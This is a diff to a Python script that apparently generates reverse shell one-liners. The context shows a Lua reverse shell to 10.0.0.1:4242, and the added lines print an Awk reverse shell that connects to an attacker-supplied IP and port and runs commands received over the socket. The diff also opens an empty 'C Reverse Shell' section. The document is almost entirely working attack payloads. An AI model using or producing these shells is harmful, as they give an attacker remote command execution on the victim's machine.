@@ -131,5 +131,14 @@ for element in generate[0]:
         print('lua5.1 -e \'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp: close()\'')
 
         print("\n------------------------------------------------------------------------")
+    if element == "awk":
+        print("\n### Awk Reverse Shell ###\n")
+
+        print('awk \'BEGIN {s = "/inet/tcp/0/'+ip+'/'+lport+'"; while(42) { do{ printf "shell > " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null')
+
+        print("\n------------------------------------------------------------------------")
+
+    if element == "C":
+        print("\n### C Reverse Shell ###\n")
 
 print()
